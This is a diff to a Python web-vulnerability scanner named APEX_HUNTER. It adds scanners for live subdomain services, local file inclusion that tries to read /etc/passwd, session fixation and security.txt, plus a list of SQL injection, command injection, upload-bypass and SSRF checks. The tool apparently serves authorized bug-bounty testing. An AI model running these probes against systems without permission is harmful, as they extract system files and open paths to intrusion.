+            for port, scheme in [(443,"https"),(80,"http"),(8080,"http"),(8443,"https")]:
+                code, body, hdrs = _fetch(f"{scheme}://{sub}:{port}/",
+                                          cfg.user_agent, 5)
+                if code and code != 0:
+                    server = hdrs.get("server","")
+                    powered = hdrs.get("x-powered-by","")
+                    tech = []
+                    if "wordpress" in body.lower(): tech.append("WordPress")
+                    if "jenkins" in body.lower(): tech.append("Jenkins")
+                    if "grafana" in body.lower(): tech.append("Grafana")
+                    if "kibana" in body.lower(): tech.append("Kibana")
+                    if "gitlab" in body.lower(): tech.append("GitLab")
+                    if tech or port != 443:
+                        warn(f"  LIVE SUBDOMAIN: {sub}:{port} [{code}] {server} {tech}")
+                        live_services.append({"sub":sub,"port":port,"code":code,"tech":tech,"server":server})
+                    break
+        if live_services:
+            hidden = [s for s in live_services if s["port"] in [8080,8443]]
+            if hidden:
+                profile.findings.append(Finding(
+                    id="F-SUBLIVE-001", title="Non-Standard Port Services on Subdomains",
+                    severity="MEDIUM", cwe="CWE-200", cvss=5.3,
+                    description=f"{len(hidden)} subdomains expose services on non-standard ports.",
+                    evidence="\n".join(f"{s['sub']}:{s['port']} [{s['code']}] {s['server']} {s['tech']}" for s in hidden[:10]),
+                    reproduction="\n".join(f"curl -sk 'http://{s['sub']}:{s['port']}/'" for s in hidden[:5]),
+                    poc_curl=f"curl -sk 'http://{hidden[0]['sub']}:{hidden[0]['port']}/'",
+                    category="Attack Surface",
+                    remediation="Audit all services on non-standard ports. Apply same security controls as primary domain."
+                ))
+        return profile
+
+# ── TOOL 63: LFI/PATH TRAVERSAL  (SKILL-73) ────────────────
+class LFIScanner:
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("LFI-63: Local File Inclusion / path traversal")
+        base = profile.url.rstrip("/")
+        params = list(set(profile.parameters[:8] + ["file","path","page","template","view","include","doc","document","src","filename","img","image"]))
+        confirmed = []
+        for param in params[:10]:
+            for payload in PAYLOADS_LFI[:8]:
+                url = f"{base}?{param}={urllib.parse.quote(payload)}"
+                code, body, _ = _fetch(url, cfg.user_agent, cfg.timeout)
+                if re.search(r'root:.*:0:0:|bin:.*:1:1:|daemon:.*:/usr/sbin', body):
+                    high(f"  LFI CONFIRMED: {param}={payload} → /etc/passwd leaked!")
+                    confirmed.append({"param":param,"payload":payload,"url":url})
+                    break
+                elif re.search(r'\[boot loader\]|extension_dir|allow_url_include', body, re.I):
+                    high(f"  LFI CONFIRMED: {param}={payload} → Windows/PHP config!")
+                    confirmed.append({"param":param,"payload":payload,"url":url})
+                    break
+                # POST
+                pc, pb, _ = _fetch(base, cfg.user_agent, cfg.timeout,
+                    method="POST", data=urllib.parse.urlencode({param:payload}).encode())
+                if re.search(r'root:.*:0:0:|bin:.*:1:1:', pb):
+                    high(f"  LFI POST: {param}={payload}")
+                    confirmed.append({"param":param,"payload":payload,"url":base+"[POST]"})
+                    break
+        if confirmed:
+            profile.findings.append(Finding(
+                id="F-LFI-001", title="Local File Inclusion (LFI)",
+                severity="CRITICAL", cwe="CWE-22", cvss=9.1,
+                description=f"LFI confirmed reading /etc/passwd via params: {[c['param'] for c in confirmed]}",
+                evidence="\n".join(f"{c['param']}: {c['payload']}" for c in confirmed[:5]),
+                reproduction="\n".join(f"curl -sk '{c['url']}'" for c in confirmed[:3]),
+                poc_curl=f"curl -sk '{confirmed[0]['url']}'",
+                category="LFI",
+                remediation="Never pass user input to file system functions. Use allow-list of permitted files."
+            ))
+        return profile
+
+# ── TOOL 64: COOKIE JAR OVERFLOW / SESSION FIXATION  (SKILL-74) ─
+class SessionSecurityAnalyzer:
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("SESSION-64: Session fixation + cookie jar overflow analysis")
+        base = profile.url.rstrip("/")
+        issues = []
+        # Session fixation: preset a session cookie and see if it's accepted
+        preset_sid = "APEXHUNTER_FIXED_SESSION_12345"
+        code, body, hdrs = _fetch(profile.url, cfg.user_agent, cfg.timeout,
+            headers_extra={"Cookie": f"session={preset_sid}; PHPSESSID={preset_sid}; JSESSIONID={preset_sid}"})
+        # If server returns same session ID back, it's accepting our preset one
+        set_cookie = hdrs.get("set-cookie","")
+        if preset_sid in set_cookie or (not set_cookie and code == 200):
+            if preset_sid in set_cookie:
+                high(f"  SESSION FIXATION: Server echoes back preset session ID!")
+                issues.append({"type":"fixation","detail":"preset SID echoed"})
+        # Cookie scope: check if session cookies have too broad domain
+        for c in profile.cookie_results:
+            name = c.get("name","")
+            if re.search(r'session|sid|auth|token', name, re.I):
+                if not c.get("issues"):
+                    ok(f"  Session cookie '{name}' properly secured")
+                else:
+                    warn(f"  Session cookie '{name}' issues: {c.get('issues')}")
+                    issues.append({"type":"cookie_flags","name":name,"issues":c.get("issues")})
+        # Test for session in URL
+        for ep in profile.api_endpoints[:10]:
+            url = base+ep if ep.startswith("/") else ep
+            if re.search(r'[?&](session|sid|token|auth|PHPSESSID|JSESSIONID)=', url, re.I):
+                high(f"  SESSION IN URL: {url[:80]}")
+                issues.append({"type":"session_in_url","url":url})
+        if any(i["type"]=="session_in_url" for i in issues):
+            profile.findings.append(Finding(
+                id="F-SES-001", title="Session Token Exposed in URL",
+                severity="HIGH", cwe="CWE-598", cvss=7.5,
+                description="Session tokens visible in URLs — logged in server logs, browser history, Referer.",
+                evidence="\n".join(i.get("url","") for i in issues if i["type"]=="session_in_url"),
+                reproduction="# Check browser address bar and server access logs",
+                poc_curl=f"# Session token visible in URLs listed above",
+                category="Session Management",
+                remediation="Use POST body or Authorization header for tokens. Never put secrets in GET parameters."
+            ))
+        return profile
+
+# ── TOOL 65: SECURITY.TXT & VDP DISCOVERY  (SKILL-75) ──────
+class VDPDiscovery:
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("VDP-65: security.txt + VDP/bug bounty scope discovery")
+        base = profile.url.rstrip("/")
+        vdp_paths = ["/.well-known/security.txt","/security.txt",
+                     "/.well-known/change-password","/bugbounty",
+                     "/responsible-disclosure","/vulnerability-disclosure"]
+        found = []; policy = {}
+        for path in vdp_paths:
+            code, body, hdrs = _fetch(base+path, cfg.user_agent, cfg.timeout)
+            if code == 200 and len(body) > 10:
+                ok(f"  VDP/Security.txt found: {path}")
+                found.append({"path":path,"body":body[:500]})
+                # Parse security.txt fields
+                for line in body.splitlines():
+                    line = line.strip()
+                    for field in ["Contact:","Expires:","Encryption:","Acknowledgments:","Policy:","Hiring:","Scope:"]:
+                        if line.startswith(field):
+                            policy[field.rstrip(":")] = line[len(field):].strip()
+                            ok(f"  {line}")
+        if policy.get("Contact"):
+            ok(f"  Bug reports: {policy['Contact']}")
+        if not found:
+            warn(f"  No security.txt found at {profile.host} — consider adding one (RFC 9116)")
+            profile.findings.append(Finding(
+                id="F-VDP-001", title="No security.txt / Vulnerability Disclosure Policy",
+                severity="INFO", cwe="CWE-200", cvss=0.0,
+                description="No security.txt file found. Researchers have no official contact for vulnerability reports.",
+                evidence=f"Checked: {vdp_paths}",
+                reproduction=f"curl -sk '{base}/.well-known/security.txt'",
+                poc_curl=f"curl -sk '{base}/.well-known/security.txt'",
+                category="VDP",
+                remediation="Create /.well-known/security.txt per RFC 9116 with Contact: and Policy: fields."
+            ))
+        return profile
+
+# ══════════════════════════════════════════════════════════════
 # REPORTER  (SKILL-29, SKILL-30)
 # ══════════════════════════════════════════════════════════════
 class APEXReporter:
@@ -2128,6 +3440,7 @@ class APEXOrchestrator:
         5: "API Mapping + GraphQL + Path Probing + S3",
         6: "Subdomain Takeover + SSRF + IDOR + XSS",
         7: "Advanced: Smuggling + JWT + OAuth + Host Injection + HPP + RateLimit + Cache + SSTI + XXE + ProtoPollu + GQL-Adv + DepConf + BizLogic + WebSocket + BOLA",
+        8: "Phase 8: SQLi + NoSQLi + CMDi + Upload + CSRF + Clickjack + MethodTamper + AcctEnum + ACLBypass + APIDowngrade + TLS + ZoneXfer + Deserial + BlindSSRF + EmailInject + JSONP + RefererBypass + 2FA + ErrorIntel + OpenRedirect + HTMLi + CORSPreflight + PwdReset + WebDAV + ContentType + InternalSvc + SubLive + LFI + Session + VDP",
     }
 
     def __init__(self, cfg: Config):
@@ -2152,6 +3465,22 @@ class APEXOrchestrator:
         self.t31 = GraphQLAdvanced(); self.t32 = DependencyConfusionDetector()
         self.t33 = BusinessLogicProbe(); self.t34 = WebSocketTester()
         self.t35 = IDORDeepScanner()
+        # Tools 36-65: Phase 8 (30 Advanced Red Team Skills)
+        self.t36 = SQLiScanner(); self.t37 = NoSQLInjection()
+        self.t38 = CommandInjectionScanner(); self.t39 = FileUploadTester()
+        self.t40 = CSRFDetector(); self.t41 = ClickjackingTester()
+        self.t42 = HTTPMethodTampering(); self.t43 = AccountEnumerationTiming()
+        self.t44 = PathACLBypass(); self.t45 = APIVersionDowngrade()
+        self.t46 = TLSMisconfigScanner(); self.t47 = DNSZoneTransfer()
+        self.t48 = DeserializationDetector(); self.t49 = BlindSSRFGenerator()
+        self.t50 = EmailHeaderInjection(); self.t51 = JSONPDiscovery()
+        self.t52 = RefererACLBypass(); self.t53 = TwoFAEndpointFinder()
+        self.t54 = ErrorPageIntelligence(); self.t55 = OpenRedirectChain()
+        self.t56 = HTMLInjectionScanner(); self.t57 = CORSPreflightAnalyzer()
+        self.t58 = PasswordResetAnalyzer(); self.t59 = WebDAVScanner()
+        self.t60 = ContentTypeConfusion(); self.t61 = InternalServiceDiscovery()
+        self.t62 = SubdomainLiveCheck(); self.t63 = LFIScanner()
+        self.t64 = SessionSecurityAnalyzer(); self.t65 = VDPDiscovery()
 
     def _init_profile(self, url: str) -> TargetProfile:
         p = urlparse(url)
@@ -2189,6 +3518,22 @@ class APEXOrchestrator:
                 p = self.t31.run(p, cfg); p = self.t32.run(p, cfg)
                 p = self.t33.run(p, cfg); p = self.t34.run(p, cfg)
                 p = self.t35.run(p, cfg)
+            elif n == 8:
+                p = self.t36.run(p, cfg); p = self.t37.run(p, cfg)
+                p = self.t38.run(p, cfg); p = self.t39.run(p, cfg)
+                p = self.t40.run(p, cfg); p = self.t41.run(p, cfg)
+                p = self.t42.run(p, cfg); p = self.t43.run(p, cfg)
+                p = self.t44.run(p, cfg); p = self.t45.run(p, cfg)
+                p = self.t46.run(p, cfg); p = self.t47.run(p, cfg)
+                p = self.t48.run(p, cfg); p = self.t49.run(p, cfg)
+                p = self.t50.run(p, cfg); p = self.t51.run(p, cfg)
+                p = self.t52.run(p, cfg); p = self.t53.run(p, cfg)
+                p = self.t54.run(p, cfg); p = self.t55.run(p, cfg)
+                p = self.t56.run(p, cfg); p = self.t57.run(p, cfg)
+                p = self.t58.run(p, cfg); p = self.t59.run(p, cfg)
+                p = self.t60.run(p, cfg); p = self.t61.run(p, cfg)
+                p = self.t62.run(p, cfg); p = self.t63.run(p, cfg)
+                p = self.t64.run(p, cfg); p = self.t65.run(p, cfg)
         except KeyboardInterrupt:
             warn("Interrupted — saving partial results...")
         except Exception as e:
@@ -2199,7 +3544,7 @@ class APEXOrchestrator:
         SEP = "═" * 70
         print(f"\n{C.BOLD}{C.WHITE}{SEP}{C.NC}")
         print(f"{C.BOLD}{C.CYAN}  APEX_HUNTER v1.0{C.NC}")
-        print(f"{C.WHITE}  35 Tools | 45 Skills | Auto-Chain Execution{C.NC}")
+        print(f"{C.WHITE}  65 Tools | 75 Skills | Auto-Chain Execution{C.NC}")
         print(f"{C.WHITE}{SEP}{C.NC}")
         print(f"  Targets : {', '.join(self.cfg.targets)}")
         print(f"  Output  : {self.cfg.output}")
@@ -2229,7 +3574,7 @@ class APEXOrchestrator:
 # SKILLS INDEX
 # ══════════════════════════════════════════════════════════════
 SKILLS_INDEX = """
-APEX_HUNTER v1.0 — Skills Index (45 Skills / 35 Tools)
+APEX_HUNTER v1.0 — Skills Index (75 Skills / 65 Tools)
 ═══════════════════════════════════════════════════════
 SKILL-01  DNS resolution & multi-record enumeration
 SKILL-02  TLS version, cipher, certificate, SAN extraction
@@ -2278,6 +3623,38 @@ SKILL-42  Dependency confusion — internal package name leakage detection
 SKILL-43  Business logic probe — negative price, overflow, coupon manipulation
 SKILL-44  WebSocket security — CSWSH, ws:// downgrade, Origin bypass
 SKILL-45  BOLA/IDOR deep scan — mass assignment, privilege escalation patterns
+
+NEW (Phase 8 — 30 Advanced Red Team Skills):
+SKILL-46  SQL injection — error-based + boolean-blind detection (9 DB engines)
+SKILL-47  NoSQL injection — MongoDB $gt/$ne/$where/$regex operator injection
+SKILL-48  Command injection — echo/id reflection-safe blind detection
+SKILL-49  File upload bypass — double extension, polyglot JPEG+PHP, MIME confusion
+SKILL-50  CSRF detection — missing token, no SameSite, no Origin validation
+SKILL-51  Clickjacking — X-Frame-Options absent + frame-ancestors wildcard
+SKILL-52  HTTP method tampering — TRACE/WebDAV/method override headers
+SKILL-53  Account enumeration timing — login response time differential
+SKILL-54  Path/ACL bypass — /admin/../user/ traversal + encoding bypass
+SKILL-55  API version downgrade — v3→v1 privilege regression testing
+SKILL-56  TLS misconfiguration — TLS 1.0/1.1 + weak ciphers (RC4/3DES/EXPORT)
+SKILL-57  DNS zone transfer — AXFR attempt via system dig command
+SKILL-58  Deserialization detection — Java magic bytes / PHP O:/ ViewState
+SKILL-59  Blind SSRF — OOB payload generator (DNS/HTTP interactor URLs)
+SKILL-60  Email header injection — CRLF in From/CC field for spam relay
+SKILL-61  JSONP discovery — callback= CSP bypass + data leakage endpoints
+SKILL-62  Referer ACL bypass — spoofed Referer to bypass origin-based access control
+SKILL-63  2FA endpoint finder — OTP endpoint discovery + rate-limit absence
+SKILL-64  Error page intelligence — stack traces / version strings in 4xx/5xx
+SKILL-65  Open redirect chain — multi-hop + OAuth redirect_uri parameter abuse
+SKILL-66  HTML injection — dangling markup + unencoded HTML in responses
+SKILL-67  CORS preflight analysis — OPTIONS method + ACAO wildcard/null check
+SKILL-68  Password reset poisoning — Host header poisoning + token reuse
+SKILL-69  WebDAV scanner — PROPFIND 207 + PUT arbitrary file write attempt
+SKILL-70  Content-Type confusion — MIME-type mirroring XSS via Content-Type
+SKILL-71  Internal service discovery — SSRF→metadata/Kubernetes/internal map
+SKILL-72  Subdomain live check — deep service fingerprinting on resolved hosts
+SKILL-73  LFI scanner — /etc/passwd read via path traversal (10 encoding variants)
+SKILL-74  Session security — fixation / token-in-URL / regeneration absence
+SKILL-75  VDP discovery — security.txt + bug-bounty scope + Hall of Fame links
 """
 
 # ══════════════════════════════════════════════════════════════
@@ -2285,13 +3662,13 @@ SKILL-45  BOLA/IDOR deep scan — mass assignment, privilege escalation patterns
 # ══════════════════════════════════════════════════════════════
 def main():
     p = argparse.ArgumentParser(
-        description="APEX_HUNTER v1.0 — 35 Tools | 45 Skills | Auto-Chain",
+        description="APEX_HUNTER v1.0 — 65 Tools | 75 Skills | Auto-Chain",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
   python APEX_HUNTER.py --target https://example.com --output ./results
   python APEX_HUNTER.py --target https://t1.com --target https://t2.com --output ./out
-  python APEX_HUNTER.py --target https://example.com --output ./out --phases 1,2,3,7
+  python APEX_HUNTER.py --target https://example.com --output ./out --phases 1,2,3,7,8
   python APEX_HUNTER.py --target https://example.com --output ./out --workers 15 --rate 3.0
   python APEX_HUNTER.py --skills
 """)
@@ -2303,8 +3680,8 @@ Examples:
     p.add_argument("--depth",    type=int,   default=3,   help="Crawl depth")
     p.add_argument("--timeout",  type=int,   default=20,  help="Request timeout (seconds)")
     p.add_argument("--scope",    action="append", default=[], dest="scope_extras")
-    p.add_argument("--phases",   default="1,2,3,4,5,6,7",
-                   help="Phases to run (default: 1-7, e.g. 1,2,7)")
+    p.add_argument("--phases",   default="1,2,3,4,5,6,7,8",
+                   help="Phases to run (default: 1-8, e.g. 1,2,7,8)")
     p.add_argument("--skills",   action="store_true", help="Print skills index and exit")
     args = p.parse_args()
 
